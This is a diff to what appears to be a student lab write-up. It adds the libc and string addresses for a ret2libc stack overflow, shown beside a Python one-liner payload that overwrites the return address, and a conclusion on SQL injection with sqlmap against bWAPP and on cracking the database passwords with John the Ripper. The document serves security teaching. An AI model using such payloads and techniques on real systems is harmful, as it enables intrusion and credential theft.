@@ -93,6 +93,10 @@ exploit the stackframe:
 
 ![image](https://github.com/user-attachments/assets/138f0c49-d1b9-4d38-81e3-f87496f4e1af)
 
+system: 0xf7e50db0
+exit: 	0xf7e449e0
+exploitPath: 0xffffd998
+
 final command:
 
 `r $(python -c "print(20*'a' + '\xb0\x0d\xe5\xf7' + '\xe0\x49\xe4\xf7' + '\x98\xd9\xff\xff')")`
@@ -223,4 +227,6 @@ use this command to hash:
 
 ![image](https://github.com/user-attachments/assets/1e19bfb8-baf1-4bf6-a8a7-41a27197012d)
 
+**Conclusion**:
 
+In Task 2 we worked with sqlmap in order to find the weaknesses within the bWapp application, performing reconnaissance for the existing databases, tables, and users. After that, we used John the Ripper to breach the passwords of the database users, illustrating how easily weak credentials can be cracked. This task highlighted the importance of improving security measures to prevent SQL injections into data storing databases.
